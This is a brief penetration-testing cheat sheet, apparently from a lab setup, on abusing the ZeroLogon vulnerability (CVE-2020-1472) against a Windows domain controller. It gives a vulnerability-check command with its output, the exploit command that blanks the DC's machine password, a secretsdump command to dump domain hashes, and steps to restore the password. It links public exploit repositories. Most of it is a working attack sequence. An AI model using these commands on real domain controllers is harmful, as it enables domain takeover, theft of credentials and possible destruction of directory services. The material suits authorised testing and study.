# Abusing ZeroLogon

- Attacking DC and setting pass to null and taking over DC **CAREFUL COULD DESTROY DC**
- Check priorly if the target is vulnerable 
  *Note: Useful for a pentest to mention to the customer that they are vulnerable without actually doing the exploitation*
  ```
  ┌──(root💀kali)-[/home/kali/CVE-2020-1472]
  └─# python3 zerologon_tester.py HYDRA-DC 10.0.2.5
  Performing authentication attempts...
  ===================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
  Success! DC can be fully compromised by a Zerologon attack.
  ```
- Changing the password to empty string: `python3 exploit.py HYDRA-DC 10.0.2.5`
- Check if it worked: `secretsdump.py -just-dc DOMAIN/DOMAIN-CONTROLLER\$@IP-OF-DC`
  Example: `secretsdump.py -just-dc MARVEL/HYDRA-DC\$@10.0.2.5`
- If we were able to dump hashes without typing password it means we owned the DC.
- Restore the machine
  - Use the admin hash to get the plain_password_hex `secretsdump.py administrator@10.0.2.5 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`
  - Restore the password `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 10.0.2.5 -hexpass <Put here the hexpass you just got>`  
    The console should print `Change password OK`

## Zerologon - Resources

- [What is ZeroLogon?](https://www.trendmicro.com/en_us/what-is/zerologon.html)
- [dirkjanm CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
- [SecuraBV ZeroLogon Checker](https://github.com/SecuraBV/CVE-2020-1472)
